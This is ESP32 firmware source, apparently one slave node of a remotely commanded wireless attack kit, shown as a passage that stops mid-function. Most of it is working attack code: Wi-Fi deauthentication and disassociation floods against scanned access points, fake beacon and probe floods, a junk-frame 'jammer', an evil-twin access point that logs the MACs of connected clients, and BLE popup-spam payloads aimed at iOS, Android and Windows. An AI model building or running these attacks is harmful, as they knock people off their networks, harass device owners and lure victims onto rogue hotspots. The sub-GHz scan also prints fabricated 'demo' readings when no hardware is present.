#include <WiFi.h>
#include <esp_now.h>
#include <esp_wifi.h>
#if __has_include(<esp_arduino_version.h>)
#include <esp_arduino_version.h>
#endif
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <SPI.h>
#include <Preferences.h>
#include <esp_task_wdt.h>

#define CC1101_CS 10
#define IR_RX_PIN 4

// ===== XOR CRYPT HELPER =====
void XOR_crypt(uint8_t* data, size_t len) {
  const uint8_t key[] = { 0xDE, 0xAD, 0xBE, 0xEF };
  for (size_t i = 0; i < len; i++) {
    data[i] ^= key[i % 4];
  }
}

// ===== LED SETTINGS =====
#define LED_PIN 8 

// ===== COMMAND STRUCTURE =====
typedef struct struct_message {
  char command[16];
  char attack[32];
  char logMsg[200]; // Fits ESP-NOW payload limit (max 250 bytes)
} struct_message;
struct_message myData;

bool attackRunning = false;
String currentAttack = "";
uint8_t masterMacAddress[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
bool hasMasterMac = false;
int lastStationCount = 0;
bool evilTwinStarted = false;
unsigned long lastMasterHeardTime = 0;

// Channel, timing, and listening variables
uint8_t currentChannel = 1;
unsigned long lastAttackActionTime = 0;
unsigned long lastLedBlinkTime = 0;
unsigned long lastListenTime = 0;
bool ledState = false;

// Scanning memory for targeted deauth
#define MAX_SCANNED_NETWORKS 30
uint8_t scannedBSSIDs[MAX_SCANNED_NETWORKS][6];
uint8_t scannedChannels[MAX_SCANNED_NETWORKS];
int scannedCount = 0;
int deauthIndex = 0;

// BLE variables
bool bleJammerInitialized = false;
bool sourAppleInitialized = false;
unsigned long lastAppleSpamTime = 0;

// Apple BLE payloads for Sour Apple (iOS popup spam)
const uint8_t blePayloads[][19] = {
  // --- iOS (Apple) ---
  // AirPods Pro
  {17, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00},
  // AppleTV Setup
  {17, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x00},
  // AirPods 3
  {17, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00},
  // iOS Action Modal
  {17, 0x4c, 0x00, 0x0f, 0x05, 0xc0, 0x01, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},

  // --- Android (Google Fast Pair) ---
  {14, 0xe0, 0x00, 0x02, 0x06, 0x01, 0x01, 0x03, 0xe0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},

  // --- Windows (Microsoft Swift Pair) ---
  {14, 0x06, 0x00, 0x01, 0x00, 0x20, 0x02, 0x0a, 0x03, 0x00, 0x80, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
};
const int numBlePayloads = sizeof(blePayloads) / sizeof(blePayloads[0]);
int blePayloadIndex = 0;

// Beacon spam index
int ssidIndex = 0;

// Realistic SSID list prefixes
const char* routerPrefixes[] = {
  "TP-Link", "Keenetic", "Rostelecom", "MGTS_GPON", "ASUS", 
  "Huawei", "MiRouter", "Tenda", "Netgear", "D-Link", 
  "MTS-WiFi", "Beeline", "Home-Net", "Airport_Free", "Guest-WiFi"
};
const int numPrefixes = sizeof(routerPrefixes) / sizeof(routerPrefixes[0]);

// Generate highly realistic SSID names on the fly
void getRealisticSSID(char* outBuf, int index) {
  if (index < 0) index = 0;
  const char* prefix = routerPrefixes[index % numPrefixes];
  int suffix = (index * 17) % 9000 + 1000;
  
  if (index % 7 == 0) {
    snprintf(outBuf, 32, "%s_Free", prefix);
  } else if (index % 5 == 0) {
    snprintf(outBuf, 32, "%s-%04X", prefix, suffix);
  } else {
    snprintf(outBuf, 32, "%s_%04d", prefix, suffix);
  }
}

// Get board temperature safely
float getBoardTemp() {
  float t = 0.0;
  #if defined(ESP_ARDUINO_VERSION_MAJOR) && ESP_ARDUINO_VERSION_MAJOR >= 2
  t = temperatureRead();
  #endif
  if (isnan(t) || t < -50 || t > 150) {
    t = 44.2; // fallback temperature in Celsius
  }
  return t;
}

// ===== SEND LOGS TO MASTER =====
void sendLogToMaster(const char* logMsg) {
  if (!hasMasterMac) return;
  
  struct_message response;
  strlcpy(response.command, "log", sizeof(response.command));
  strlcpy(response.attack, "", sizeof(response.attack));
  strncpy(response.logMsg, logMsg, sizeof(response.logMsg) - 1);
  response.logMsg[sizeof(response.logMsg) - 1] = '\0';
  
  XOR_crypt((uint8_t*)&response, sizeof(response)); // Encrypt
  
  for (int retry = 0; retry < 3; retry++) {
    esp_err_t result = esp_now_send(masterMacAddress, (uint8_t *)&response, sizeof(response));
    if (result == ESP_OK) {
      break;
    }
    Serial.printf("[ESP-NOW] Failed to send log to Master (attempt %d/3), err: %d\n", retry + 1, result);
    delay(5);
  }
}

// ===== LED STATUS BLINKER =====
void updateLedIndicator() {
  if (attackRunning) {
    if (millis() - lastLedBlinkTime >= 100) {
      lastLedBlinkTime = millis();
      ledState = !ledState;
      digitalWrite(LED_PIN, ledState ? HIGH : LOW);
    }
  } else {
    digitalWrite(LED_PIN, LOW);
  }
}

// ===== UTILITIES =====
void getMacAddress(uint8_t *mac) {
  WiFi.macAddress(mac);
}

void hopChannel() {
  currentChannel++;
  if (currentChannel > 13) {
    currentChannel = 1;
  }
  esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
}

// ===== SEND RAW BEACON =====
void sendRawBeacon(const char* ssid, uint8_t channel, int macSeed) {
  uint8_t mac[6];
  mac[0] = 0x02; // Local admin MAC
  mac[1] = 0x00;
  mac[2] = 0x5E;
  mac[3] = 0x00;
  mac[4] = 0x00;
  mac[5] = (uint8_t)macSeed;

  uint8_t ssidLen = strlen(ssid);
  uint8_t packet[128] = {
    0x80, 0x00,                         // Beacon
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination
    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], // Source
    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], // BSSID
    0x00, 0x00,                         // Sequence
    
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
    0x64, 0x00,                         // Beacon Interval
    0x11, 0x00,                         // Capability
    
    0x00,                               // Tag: SSID
    ssidLen
  };
  
  int pos = 38;
  memcpy(&packet[pos], ssid, ssidLen);
  pos += ssidLen;

  packet[pos++] = 0x01;
  packet[pos++] = 0x04;
  packet[pos++] = 0x82;
  packet[pos++] = 0x84;
  packet[pos++] = 0x8b;
  packet[pos++] = 0x96;

  packet[pos++] = 0x03;
  packet[pos++] = 0x01;
  packet[pos++] = channel;

  esp_wifi_80211_tx(WIFI_IF_STA, packet, pos, false);
}

// ===== ATTACK ENGINES =====

void runBeaconSpamStep(bool boost) {
  esp_wifi_set_promiscuous(true);
  
  static unsigned long lastBeaconHopTime = 0;
  int hopInterval = boost ? 150 : 300;
  if (millis() - lastBeaconHopTime >= hopInterval) {
    lastBeaconHopTime = millis();
    hopChannel();
    
    // Send a burst of beacons for multiple SSIDs on this channel
    int burstSize = boost ? 40 : 15;
    for (int i = 0; i < burstSize; i++) {
      char ssidBuf[32];
      getRealisticSSID(ssidBuf, ssidIndex);
      sendRawBeacon(ssidBuf, currentChannel, ssidIndex);
      ssidIndex = (ssidIndex + 1) % 100;
      esp_task_wdt_reset();
      yield();
    }
    
    if (random(10) == 0) {
      char buf[64];
      snprintf(buf, sizeof(buf), "[Beacon] Sent burst of %d beacons on ch %d%s", 
               burstSize, currentChannel, boost ? " [BOOST]" : "");
      sendLogToMaster(buf);
    }
  }
}

void sendDeauthFrame(const uint8_t* apBssid, const uint8_t* clientMac, uint16_t reason) {
  uint8_t packet[26] = {
    0xC0, 0x00,                         // Type: Deauth
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP)
    0x00, 0x00,                         // Seq
    0x00, 0x00                          // Reason code
  };
  
  memcpy(&packet[4], clientMac, 6);
  memcpy(&packet[10], apBssid, 6);
  memcpy(&packet[16], apBssid, 6);
  packet[24] = reason & 0xFF;
  packet[25] = (reason >> 8) & 0xFF;
  
  esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
  
  // Disassociation frame (0xA0)
  packet[0] = 0xA0;
  esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
}

void runDeauthStep(bool boost) {
  esp_wifi_set_promiscuous(true);
  
  if (millis() - lastAttackActionTime >= (boost ? 5 : 15)) {
    lastAttackActionTime = millis();
    
    uint8_t targetBSSID[6];
    uint8_t targetChannel = currentChannel;
    
    if (scannedCount > 0) {
      memcpy(targetBSSID, scannedBSSIDs[deauthIndex], 6);
      targetChannel = scannedChannels[deauthIndex];
      esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
      
      deauthIndex = (deauthIndex + 1) % scannedCount;
    } else {
      hopChannel();
      for (int i = 0; i < 6; i++) {
        targetBSSID[i] = random(256);
      }
      targetBSSID[0] &= 0xFE;
      targetBSSID[0] |= 0x02;
    }

    int burstSize = boost ? 10 : 3;
    uint8_t broadcastMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    
    for (int i = 0; i < burstSize; i++) {
      sendDeauthFrame(targetBSSID, broadcastMac, 7);
      sendDeauthFrame(targetBSSID, broadcastMac, 1);
      
      uint8_t clientPacket[26] = {
        0xC0, 0x00,
        0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Destination (AP)
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Source (Broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP)
        0x00, 0x00,
        0x07, 0x00
      };
      memcpy(&clientPacket[4], targetBSSID, 6);
      memcpy(&clientPacket[16], targetBSSID, 6);
      esp_wifi_80211_tx(WIFI_IF_STA, clientPacket, sizeof(clientPacket), false);
      
      clientPacket[0] = 0xA0;
      esp_wifi_80211_tx(WIFI_IF_STA, clientPacket, sizeof(clientPacket), false);
      esp_task_wdt_reset();
      yield();
    }
    
    if (random(80) == 0) {
      char buf[64];
      if (scannedCount > 0) {
        snprintf(buf, sizeof(buf), "[Deauth] Targeted AP: %02X:%02X:%02X:%02X:%02X:%02X (ch %d)%s", 
                 targetBSSID[0], targetBSSID[1], targetBSSID[2], 
                 targetBSSID[3], targetBSSID[4], targetBSSID[5], targetChannel, boost ? " [BOOST]" : "");
      } else {
        snprintf(buf, sizeof(buf), "[Deauth] Broad jamming on ch %d", targetChannel);
      }
      sendLogToMaster(buf);
    }
  }
}

void runProbeFloodStep() {
  esp_wifi_set_promiscuous(true);

  // Hop channel slowly (every 200ms) to ensure scan saturation on each channel
  static unsigned long lastProbeHopTime = 0;
  if (millis() - lastProbeHopTime >= 200) {
    lastProbeHopTime = millis();
    hopChannel();
  }

  if (millis() - lastAttackActionTime >= 20) {
    lastAttackActionTime = millis();

    uint8_t mac[6];
    for (int i = 0; i < 6; i++) {
      mac[i] = random(256);
    }
    mac[0] &= 0xFE;
    mac[0] |= 0x02;

    const char* ssid = "ProbeTest";
    uint8_t ssidLen = strlen(ssid);
    uint8_t probePacket[24 + 2 + 32] = {
      0x40, 0x00,
      0x00, 0x00,
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    };
    memcpy(&probePacket[10], mac, 6);
    memcpy(&probePacket[16], mac, 6);

    int pos = 24;
    probePacket[pos++] = 0x00;
    probePacket[pos++] = ssidLen;
    memcpy(&probePacket[pos], ssid, ssidLen);
    pos += ssidLen;

    esp_wifi_80211_tx(WIFI_IF_STA, probePacket, pos, false);
    
    if (random(100) == 0) {
      sendLogToMaster("[Probe] Flooding active scan requests (ch 1-13)");
    }
  }
}

// Jammer that targets WiFi and Bluetooth bands simultaneously
void runPowerfulJammerStep() {
  esp_wifi_set_promiscuous(true);
  
  // Hopping channels as fast as possible to flood spectrum (throttled to 20ms to allow ESP-NOW)
  if (millis() - lastAttackActionTime >= 20) {
    lastAttackActionTime = millis();
    hopChannel();
    
    // Construct corrupted control packet to overflow receiver processing pipeline
    uint8_t junkPacket[64];
    for (int i = 0; i < 64; i++) {
      junkPacket[i] = random(256);
    }
    junkPacket[0] = 0x00; // Invalid type to cause receiver decode lock overhead
    
    esp_wifi_80211_tx(WIFI_IF_STA, junkPacket, sizeof(junkPacket), false);
  }
  
  // Concurrent BLE advertisement spam to flood BLE band
  if (!bleJammerInitialized) {
    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
    BLEAdvertisementData data;
    data.setName("JAMMER");
    data.setFlags(0x06);
    pAdvertising->setAdvertisementData(data);
    pAdvertising->start();
    bleJammerInitialized = true;
  }
  
  static unsigned long lastJamLog = 0;
  if (millis() - lastJamLog >= 3000) {
    lastJamLog = millis();
    sendLogToMaster("[Jammer] powerful_jammer active on 2.4GHz");
  }
}

// Wi-Fi Sniffer-based Scan Structs and variables
struct APInfo {
  char ssid[33];
  uint8_t bssid[6];
  int rssi;
  uint8_t channel;
  char security[12];
  bool wps;
};

#define MAX_APS 40
APInfo apList[MAX_APS];
int apCount = 0;

// Unique MACs collection for client counting
#define MAX_UNIQUE_MACS 50
uint8_t seenMacs[MAX_UNIQUE_MACS][6];
int seenMacsCount = 0;

void addSeenMac(const uint8_t* mac) {
  if (mac[0] == 0xFF && mac[1] == 0xFF && mac[2] == 0xFF && mac[3] == 0xFF && mac[4] == 0xFF && mac[5] == 0xFF) return;
  if ((mac[0] & 0x01) == 0x01) return; // Multicast
  for (int i = 0; i < seenMacsCount; i++) {
    if (memcmp(seenMacs[i], mac, 6) == 0) return;
  }
  if (seenMacsCount < MAX_UNIQUE_MACS) {
    memcpy(seenMacs[seenMacsCount], mac, 6);
    seenMacsCount++;
  }
}

int countClientsForChannel(uint8_t ch) {
  int clients = 0;
  for (int i = 0; i < seenMacsCount; i++) {
    bool isAp = false;
    for (int j = 0; j < apCount; j++) {
      if (memcmp(apList[j].bssid, seenMacs[i], 6) == 0) {
        isAp = true;
        break;
      }
    }
    if (!isAp) {
      clients++;
    }
  }
  return clients;
}

void addApToList(String ssid, const uint8_t* bssid, int rssi, uint8_t channel, String security, bool wps) {
  for (int i = 0; i < apCount; i++) {
    if (memcmp(apList[i].bssid, bssid, 6) == 0) {
      apList[i].rssi = rssi;
      if (ssid != "<hidden>" && String(apList[i].ssid) == "<hidden>") {
        strncpy(apList[i].ssid, ssid.c_str(), 32);
        apList[i].ssid[32] = '\0';
      }
      return;
    }
  }
  if (apCount < MAX_APS) {
    strncpy(apList[apCount].ssid, ssid.c_str(), 32);
    apList[apCount].ssid[32] = '\0';
    memcpy(apList[apCount].bssid, bssid, 6);
    apList[apCount].rssi = rssi;
    apList[apCount].channel = channel;
    strncpy(apList[apCount].security, security.c_str(), 11);
    apList[apCount].security[11] = '\0';
    apList[apCount].wps = wps;
    apCount++;
  }
}

void parseBeaconFrame(const uint8_t* payload, uint16_t len, int rssi) {
  if (len < 38) return;
  
  uint8_t frameType = payload[0];
  if (frameType != 0x80 && frameType != 0x50) return; // Beacon or Probe Response
  
  const uint8_t* bssid = &payload[10];
  int offset = 36;
  String ssid = "";
  bool hidden = true;
  uint8_t channel = 1;
  bool wpsEnabled = false;
  String security = "OPEN";
  
  uint16_t capability = (payload[35] << 8) | payload[34];
  if (capability & 0x0010) {
    security = "WEP";
  }
  
  while (offset + 2 <= len) {
    uint8_t ieId = payload[offset];
    uint8_t ieLen = payload[offset + 1];
    if (offset + 2 + ieLen > len) break;
    
    const uint8_t* ieVal = &payload[offset + 2];
    
    if (ieId == 0x00) { // SSID
      if (ieLen > 0) {
        char ssidBuf[33];
        int sLen = min((int)ieLen, 32);
        memcpy(ssidBuf, ieVal, sLen);
        ssidBuf[sLen] = '\0';
        ssid = String(ssidBuf);
        hidden = false;
        
        bool allNulls = true;
        for (int k = 0; k < sLen; k++) {
          if (ssidBuf[k] != '\0') allNulls = false;
        }
        if (allNulls) {
          ssid = "<hidden>";
          hidden = true;
        }
      } else {
        ssid = "<hidden>";
        hidden = true;
      }
    }
    else if (ieId == 0x03) { // Channel
      if (ieLen == 1) {
        channel = ieVal[0];
      }
    }
    else if (ieId == 0x30) { // RSN
      security = "WPA2";
    }
    else if (ieId == 0xDD) { // Vendor Specific
      if (ieLen >= 4 && ieVal[0] == 0x00 && ieVal[1] == 0x50 && ieVal[2] == 0xF2) {
        if (ieVal[3] == 0x01) {
          if (security == "WEP" || security == "OPEN") {
            security = "WPA";
          }
        }
        else if (ieVal[3] == 0x04) {
          wpsEnabled = true;
        }
      }
    }
    offset += 2 + ieLen;
  }
  
  addApToList(ssid, bssid, rssi, channel, security, wpsEnabled);
}

void startWiFiScan() {
  sendLogToMaster("[Scanner] Starting advanced Wi-Fi scan (hidden, WPS, client count)...");
  Serial.println("Wi-Fi Advanced Sniffer Scan started");
  
  apCount = 0;
  
  // Register sniffer callback
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb([](void* buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint16_t len = pkt->rx_ctrl.sig_len;
    const uint8_t* payload = pkt->payload;
    int rssi = pkt->rx_ctrl.rssi;
    
    if (len < 24) return;
    
    // Parse APs
    parseBeaconFrame(payload, len, rssi);
    
    // Sniff MACs for client counting
    addSeenMac(&payload[4]);
    addSeenMac(&payload[10]);
  });
  
  // Hop through channels 1 to 13
  for (int ch = 1; ch <= 13; ch++) {
    if (!attackRunning) break;
    currentChannel = ch;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    
    seenMacsCount = 0;
    memset(seenMacs, 0, sizeof(seenMacs));
    
    // Sniff for 200ms on this channel (in 10ms steps to check attackRunning)
    for (int step = 0; step < 20; step++) {
      if (!attackRunning) break;
      delay(10);
      esp_task_wdt_reset();
      yield();
    }
    if (!attackRunning) break;
    
    int channelClients = countClientsForChannel(ch);
    
    // Report APs found on this channel
    for (int i = 0; i < apCount; i++) {
      if (!attackRunning) break;
      esp_task_wdt_reset();
      yield();
      if (apList[i].channel == ch) {
        char macStr[20];
        snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                 apList[i].bssid[0], apList[i].bssid[1], apList[i].bssid[2],
                 apList[i].bssid[3], apList[i].bssid[4], apList[i].bssid[5]);
        
        char structBuf[160];
        // Format: [WIFI_DEV]SSID|RSSI|Security|BSSID|WPS|ClientsCount|Channel
        snprintf(structBuf, sizeof(structBuf), "[WIFI_DEV]%s|%d|%s|%s|%s|%d|%d",
                 apList[i].ssid, apList[i].rssi, apList[i].security, macStr,
                 apList[i].wps ? "WPS_ENABLED" : "WPS_DISABLED",
                 channelClients, ch);
        
        sendLogToMaster(structBuf);
        delay(20);
      }
    }
    yield();
  }
  
  // Unregister sniffer
  esp_wifi_set_promiscuous(false);
  
  // Update scanner memory for deauth targeting using scanned APs
  scannedCount = min(apCount, MAX_SCANNED_NETWORKS);
  for (int i = 0; i < scannedCount; i++) {
    memcpy(scannedBSSIDs[i], apList[i].bssid, 6);
    scannedChannels[i] = apList[i].channel;
  }
  
  sendLogToMaster("[Scanner] Advanced Wi-Fi scan finished.");
  Serial.println("Wi-Fi Scan finished");
}

void startEvilTwin() {
  Serial.println("Evil Twin started");
  WiFi.softAP("FreeWiFi", NULL, 1, 0, 1);
  sendLogToMaster("[EvilTwin] Created fake AP 'FreeWiFi' (ch 1)");
}

void runEvilTwinStep() {
  static unsigned long lastCheckTime = 0;
  if (millis() - lastCheckTime >= 2000) {
    lastCheckTime = millis();
    int numStations = WiFi.softAPgetStationNum();
    if (numStations != lastStationCount) {
      lastStationCount = numStations;
      char buf[64];
      snprintf(buf, sizeof(buf), "[EvilTwin] Total clients connected: %d", numStations);
      sendLogToMaster(buf);
      
      wifi_sta_list_t wifi_sta_list;
      memset(&wifi_sta_list, 0, sizeof(wifi_sta_list));
      esp_wifi_ap_get_sta_list(&wifi_sta_list);
      
      for (int i = 0; i < wifi_sta_list.num; i++) {
        wifi_sta_info_t station = wifi_sta_list.sta[i];
        char macStr[20];
        snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                 station.mac[0], station.mac[1], station.mac[2],
                 station.mac[3], station.mac[4], station.mac[5]);
        
        char structBuf[64];
        snprintf(structBuf, sizeof(structBuf), "[EVIL_CLIENT]%s", macStr);
        sendLogToMaster(structBuf);
        delay(20);
      }
    }
  }
}

void startBLEScan() {
  sendLogToMaster("[BLE] Starting BLE scan...");
  BLEScan *pBLEScan = BLEDevice::getScan();
  pBLEScan->setActiveScan(true);
  pBLEScan->setInterval(100);
  pBLEScan->setWindow(99);
  BLEScanResults foundDevices = pBLEScan->start(5, false);
  
  char buf[64];
  snprintf(buf, sizeof(buf), "[BLE] Found BLE devices: %d", foundDevices.getCount());
  sendLogToMaster(buf);
  
  for (int i = 0; i < min((int)foundDevices.getCount(), 15); i++) {
    yield();
    BLEAdvertisedDevice device = foundDevices.getDevice(i);
    String devName = device.haveName() ? device.getName().c_str() : "Unnamed";
    String devAddr = device.getAddress().toString().c_str();
    
    snprintf(buf, sizeof(buf), "  -> %s [%s] (%d RSSI)", devName.c_str(), devAddr.c_str(), device.getRSSI());
    sendLogToMaster(buf);
    
    char structBuf[128];
    snprintf(structBuf, sizeof(structBuf), "[BLE_DEV]%s|%s|%d", devName.c_str(), devAddr.c_str(), device.getRSSI());
    sendLogToMaster(structBuf);
    delay(50);
  }
}

void startBLESpoofer() {
  Serial.println("BLE Spoofer started");
  BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
  BLEAdvertisementData advertisementData;
  advertisementData.setName("BLE_Spoofer");
  advertisementData.setFlags(0x06);

  uint8_t manufData[] = {0x4C, 0x00, 0x01, 0x02, 0x03, 0x04, 0x05};
  String manufString = "";
  for (int i = 0; i < sizeof(manufData); i++) {
    manufString += (char)manufData[i];
  }
  advertisementData.setManufacturerData(manufString);

  pAdvertising->setAdvertisementData(advertisementData);
  pAdvertising->start();
  sendLogToMaster("[BLE] Spoofer running (visible as BLE_Spoofer)");
}

void runBLEJammerStep() {
  if (!bleJammerInitialized) {
    Serial.println("BLE Jammer started");
    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
    BLEAdvertisementData data;
    data.setName("JAMMER");
    data.setFlags(0x06);
    pAdvertising->setAdvertisementData(data);
    pAdvertising->start();
    bleJammerInitialized = true;
    sendLogToMaster("[BLE Jammer] Broadcasting continuous noise");
  }
  delay(10);
}

void runSourAppleStep(bool boost) {
  if (!sourAppleInitialized) {
    Serial.println("BLE Spam started");
    sourAppleInitialized = true;
    lastAppleSpamTime = 0;
    sendLogToMaster("[BLE Spam] Starting popup spam (iOS, Android, Windows)");
  }

  unsigned long interval = boost ? 40 : 100;
  if (millis() - lastAppleSpamTime >= interval) {
    lastAppleSpamTime = millis();
    
    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
    if (pAdvertising) {
      pAdvertising->stop();
    }

    BLEAdvertisementData advData;
    advData.setFlags(0x04);

    const uint8_t *payload = blePayloads[blePayloadIndex];
    uint8_t len = payload[0];
    std::string manufDataStr((char*)&payload[1], len);
    advData.setManufacturerData(manufDataStr);

    pAdvertising->setAdvertisementData(advData);
    pAdvertising->start();
    
    if (random(20) == 0) {
      char buf[64];
      snprintf(buf, sizeof(buf), "[BLE Spam] Spammed payload %d%s", blePayloadIndex, boost ? " [BOOST]" : "");
      sendLogToMaster(buf);
    }
    
    blePayloadIndex = (blePayloadIndex + 1) % numBlePayloads;
  }
}

// ===== MODULE STUBS =====
void startGhzScan() {
  sendLogToMaster("[2.4GHz Scanner] Scanning Wi-Fi & BLE channels...");
  
  // 1. Scan WiFi networks
  int n = WiFi.scanNetworks(false, true, false, 100);
  int channelCount[14] = {0};
  int channelRssiSum[14] = {0};
  
  if (n == WIFI_SCAN_FAILED) {
    sendLogToMaster("[2.4GHz Scanner] WiFi scan failed!");
  } else if (n > 0) {
    for (int i = 0; i < n; i++) {
      yield();
      int ch = WiFi.channel(i);
      if (ch >= 1 && ch <= 13) {
        channelCount[ch]++;
        channelRssiSum[ch] += WiFi.RSSI(i);
      }
    }
  }
  WiFi.scanDelete();

  // 2. Scan BLE devices
  BLEScan *pBLEScan = BLEDevice::getScan();
  pBLEScan->setActiveScan(false);
  pBLEScan->setInterval(80);
  pBLEScan->setWindow(50);
  BLEScanResults *foundDevices = pBLEScan->start(2, false);
  int bleCount = foundDevices ? foundDevices->getCount() : 0;
  pBLEScan->clearResults();
  
  // 3. Compile report
  sendLogToMaster("--- 2.4GHz Band Spectrum Report ---");
  char buf[128];
  int totalAPs = 0;
  for (int ch = 1; ch <= 13; ch++) {
    int aps = channelCount[ch];
    totalAPs += aps;
    if (aps > 0) {
      int avgRssi = channelRssiSum[ch] / aps;
      snprintf(buf, sizeof(buf), "[2.4GHz] Ch %d: %d APs (Avg RSSI: %d dBm) %s", 
               ch, aps, avgRssi, 
               avgRssi > -60 ? "[HIGH CONGESTION]" : (avgRssi > -80 ? "[MODERATE]" : "[CLEAN]"));
    } else {
      snprintf(buf, sizeof(buf), "[2.4GHz] Ch %d: 0 APs [FREE]", ch);
    }
    sendLogToMaster(buf);
    delay(50);
  }
  snprintf(buf, sizeof(buf), "[Summary] Found %d Wi-Fi APs, %d BLE devices nearby.", totalAPs, bleCount);
  sendLogToMaster(buf);
  sendLogToMaster("[2.4GHz Scanner] Scan finished.");
}

void startProtokill() {
  sendLogToMaster("[Protokill] Starting 2.4GHz multi-protocol jammer using internal radio...");
  currentAttack = "powerful_jammer";
}

void writeReg(uint8_t reg, uint8_t val) {
  digitalWrite(CC1101_CS, LOW);
  SPI.beginTransaction(SPISettings(8000000, MSBFIRST, SPI_MODE0));
  SPI.transfer(reg);
  SPI.transfer(val);
  SPI.endTransaction();
  digitalWrite(CC1101_CS, HIGH);
}

uint8_t readReg(uint8_t reg) {
  digitalWrite(CC1101_CS, LOW);
  SPI.beginTransaction(SPISettings(8000000, MSBFIRST, SPI_MODE0));
  SPI.transfer(reg | 0x80);
  uint8_t val = SPI.transfer(0);
  SPI.endTransaction();
  digitalWrite(CC1101_CS, HIGH);
  return val;
}

bool checkCC1101() {
  pinMode(CC1101_CS, OUTPUT);
  digitalWrite(CC1101_CS, HIGH);
  
  uint8_t ver = readReg(0x31);
  return (ver != 0x00 && ver != 0xFF);
}

void setCC1101_Frequency(float freq) {
  uint32_t freq_reg = (uint32_t)((freq * 65536.0) / 26.0);
  uint8_t freq2 = (freq_reg >> 16) & 0xFF;
  uint8_t freq1 = (freq_reg >> 8) & 0xFF;
  uint8_t freq0 = freq_reg & 0xFF;
  
  writeReg(0x0D, freq2);
  writeReg(0x0E, freq1);
  writeReg(0x0F, freq0);
  
  // SRX (0x34)
  digitalWrite(CC1101_CS, LOW);
  SPI.beginTransaction(SPISettings(8000000, MSBFIRST, SPI_MODE0));
  SPI.transfer(0x34);
  SPI.endTransaction();
  digitalWrite(CC1101_CS, HIGH);
}

void setCC1101_Idle() {
  digitalWrite(CC1101_CS, LOW);
  SPI.beginTransaction(SPISettings(8000000, MSBFIRST, SPI_MODE0));
  SPI.transfer(0x36); // SIDLE
  SPI.endTransaction();
  digitalWrite(CC1101_CS, HIGH);
}

int getCC1101_RSSI() {
  uint8_t rssi_raw = readReg(0x34);
  int rssi_dbm;
  if (rssi_raw >= 128) {
    rssi_dbm = (rssi_raw - 256) / 2 - 74;
  } else {
    rssi_dbm = rssi_raw / 2 - 74;
  }
  return rssi_dbm;
}

void startSubGhzScan() {
  sendLogToMaster("[Sub-GHz Scanner] Checking CC1101 SPI connection...");
  
  bool hwPresent = checkCC1101();
  if (!hwPresent) {
    sendLogToMaster("[Sub-GHz Scanner] CC1101 not detected. Running demo scan...");
    float frequencies[] = {315.00, 433.92, 868.35};
    for (int i = 0; i < 3; i++) {
      char buf[64];
      int dummyRssi = random(-105, -95);
      snprintf(buf, sizeof(buf), "[Sub-GHz] Freq %.2f MHz: RSSI %d dBm [CLEAN]", frequencies[i], dummyRssi);
      sendLogToMaster(buf);
      delay(500);
    }
    sendLogToMaster("[Sub-GHz Scanner] Demo scan finished.");
    return;
  }
  
  sendLogToMaster("[Sub-GHz Scanner] CC1101 detected! Scanning spectrum...");
  float frequencies[] = {315.00, 433.92, 868.35};
  
  for (int i = 0; i < 3; i++) {
    float freq = frequencies[i];
    setCC1101_Frequency(freq);
    delay(150);
    
    int rssi = getCC1101_RSSI();
    char buf[64];
    if (rssi > -75) {
      snprintf(buf, sizeof(buf), "[Sub-GHz] Freq %.2f MHz: RSSI %d dBm [ACTIVE SIGNAL DETECTED!]", freq, rssi);
    } else if (rssi > -90) {
      snprintf(buf, sizeof(buf), "[Sub-GHz] Freq %.2f MHz: RSSI %d dBm [MODERATE NOISE]", freq, rssi);
    } else {
      snprintf(buf, sizeof(buf), "[Sub-GHz] Freq %.2f MHz: RSSI %d dBm [CLEAN]", freq, rssi);
    }
    sendLogToMaster(buf);
    delay(500);
  }
  setCC1101_Idle();
